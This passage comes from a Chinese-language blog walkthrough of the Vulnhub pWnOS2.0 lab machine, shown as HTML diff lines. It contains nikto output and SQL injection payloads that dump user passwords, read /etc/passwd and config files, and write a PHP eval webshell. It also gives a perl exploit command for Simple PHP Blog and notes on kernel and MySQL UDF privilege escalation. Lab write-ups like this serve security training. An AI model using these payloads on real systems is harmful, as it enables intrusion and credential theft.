Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;images&#x2F;?pattern&#x3D;&#x2F;etc&#x2F;*&amp;sort&#x3D;name: Directory indexing found.</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;blog&#x2F;config&#x2F;config.txt, inode: 264197, size: 108, mtime: Tue May 10 07:12:22 2011</span><br><span class="line">+ &#x2F;blog&#x2F;config&#x2F;config.txt: Configuration file found.</span><br><span class="line">+ &#x2F;blog&#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8313 requests: 0 error(s) and 27 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-11 20:53:00 (GMT8) (69 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="Walkthrough-1"><a href="#Walkthrough-1" class="headerlink" title="Walkthrough-1"></a>Walkthrough-1</h3><p>经过探索，我发现<a href="http://10.10.10.100/info.php是一个phpinfo页面，它向我们揭示了网站的绝对路径`/var/www/`" target="_blank" rel="noopener">http://10.10.10.100/info.php是一个phpinfo页面，它向我们揭示了网站的绝对路径`/var/www/`</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220231.jpg" alt=""></p>
+<p>同时<a href="http://10.10.10.100/login.php存在sql注入漏洞。" target="_blank" rel="noopener">http://10.10.10.100/login.php存在sql注入漏洞。</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220342.jpg" alt=""><br>我在这里爆破出了后台的用户名和密码，但是没什么用。</p>
+<figure class="highlight plain"><figcaption><span>POST-sql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;%27 union select 1,2,3,databases(),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema&#x3D;database()  -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_schema&#x3D;&#39;ch16&#39; and table_name&#x3D;&#39;users&#39; -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(email),5,6,7,8 from users -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(pass),5,6,7,8 from users -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,load_file(&#39;&#x2F;var&#x2F;www&#x2F;includes&#x2F;config.inc.php&#39;),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,&#39;&lt;?php eval($_POST[admin])?&gt;&#39;,5,6,7,8 into outfile &#39;&#x2F;var&#x2F;www&#x2F;blog&#x2F;shell.php&#39; -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br></pre></td></tr></table></figure>
+
+<p>但是我在这里尝试去写文件，结果是成功写入的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220536.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220631.jpg" alt=""></p>
+<p>蚁剑连上后，发现/var/下有两个mysqli_connect的文件，两个密码都试了一下。。结果登录成功了root用户。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_221545.jpg" alt=""></p>
+<h3 id="Walkthrough-2"><a href="#Walkthrough-2" class="headerlink" title="Walkthrough-2"></a>Walkthrough-2</h3><p>和先前的步骤一样，从蚁剑连入然后反弹个shell回来。使用<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">脚本</a>获取提权建议后，我选择了<a href="https://www.exploit-db.com/download/26131" target="_blank" rel="noopener">CVE-2013-2094</a>提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_222118.jpg" alt=""></p>
+<h3 id="其他获得webshell的方法"><a href="#其他获得webshell的方法" class="headerlink" title="其他获得webshell的方法"></a>其他获得webshell的方法</h3><p>因为网站根目录下还有一个blog的目录，对其进行进一步信息收集后，会发现该blog使用的是<code>simple php blog</code>版本应该是0.4.0。使用<code>searchsploit</code>搜索相关的exp后，会发现该cms版本有一个<a href="https://www.exploit-db.com/exploits/1191" target="_blank" rel="noopener">远程命令执行</a></p>
+<p>将这个perl脚本下载回来后运行，可以将原本blog的帐号密码，替换为自己设置的密码。最后上传个木马什么的，也可以getshell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl 1191.pl -h http:&#x2F;&#x2F;10.10.10.100&#x2F;blog -e 3 -U hacker -P hacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="可能可行的提权方式"><a href="#可能可行的提权方式" class="headerlink" title="可能可行的提权方式"></a>可能可行的提权方式</h3><p>运行了ps -ef后，发现mysql是由root用户运行，所以可以考虑udf提权?按照这篇<a href="https://blog.csdn.net/qq_33020901/article/details/78827375" target="_blank" rel="noopener">博文</a>测试我是没有成功的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &#39;mysqludf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;mysqludf.so&#39;;</span><br><span class="line">ERROR 1126 (HY000): Can&#39;t open shared library &#39;mysqludf.so&#39; (errno: 22 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;mysqludf.so: invalid ELF header)</span><br></pre></td></tr></table></figure>
+
+<h3 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h3><p>一开始尝试了脏牛提权，但是不成功。</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>枚举是关键。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/07/11/Vulnhub-pWnOS2/" title="Vulnhub-pWnOS2.0">http://atsud0.me/2020/07/11/Vulnhub-pWnOS2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql-injection</a>
+              <a href="/tags/CVE-2013-2094/" rel="tag"><i class="fa fa-tag"></i> CVE-2013-2094</a>
+              <a href="/tags/simple-php-blog/" rel="tag"><i class="fa fa-tag"></i> simple php blog</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/11/TryHackMe-Gatekeeper/" rel="prev" title="TryHackMe-Gatekeeper">
+      <i class="fa fa-chevron-left"></i> TryHackMe-Gatekeeper
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/12/Vulnhub-SkyTower/" rel="next" title="Vulnhub-SkyTower">
+      Vulnhub-SkyTower <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap扫描"><span class="nav-number">1.1.</span> <span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录扫描"><span class="nav-number">1.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nikto扫描"><span class="nav-number">1.3.</span> <span class="nav-text">nikto扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Walkthrough-1"><span class="nav-number">2.1.</span> <span class="nav-text">Walkthrough-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Walkthrough-2"><span class="nav-number">2.2.</span> <span class="nav-text">Walkthrough-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他获得webshell的方法"><span class="nav-number">2.3.</span> <span class="nav-text">其他获得webshell的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#可能可行的提权方式"><span class="nav-number">2.4.</span> <span class="nav-text">可能可行的提权方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#失败的尝试"><span class="nav-number">2.5.</span> <span class="nav-text">失败的尝试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">3.</span> <span class="nav-text">0x03 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
